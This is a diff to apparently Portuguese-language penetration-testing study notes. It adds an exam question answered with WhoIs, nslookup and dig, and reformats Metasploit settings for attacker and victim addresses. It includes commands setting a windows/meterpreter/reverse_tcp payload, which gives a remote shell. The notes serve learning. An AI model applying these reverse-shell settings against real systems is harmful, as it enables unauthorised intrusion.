@@ -197,14 +197,28 @@ LPORT: Porta do Invasor
 SET PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
+**Enunciado da Questão - Resposta dela abaixo.**
+
+**Questão 19 -  Cite três formas de descobrir o servidor de DNS de um serviço hospedado na WWW:**
+
+WhoIs
+nslookup (nslookup -type=NS dominio.com)
+dig (dig NS dominio.com)
+
 # Variáveis para setar nos exploits:
 
 LHOST: IP do Invasor 
+
 LPORT: Porta do Invasor
+
 RHOST: IP da Vítima
+
 RPORT: Porta da Vítima
+
 PAYLOAD : Payload para invasão
 
-Ex: SET LHOST 192.168.?.?
-    SET LPORT 4444
-    SET PAYLOAD windows/meterpreter/reverse_tcp
+# Como setar? 
+
+SET LHOST 192.168.?.?
+SET LPORT 4444
+SET PAYLOAD windows/meterpreter/reverse_tcp
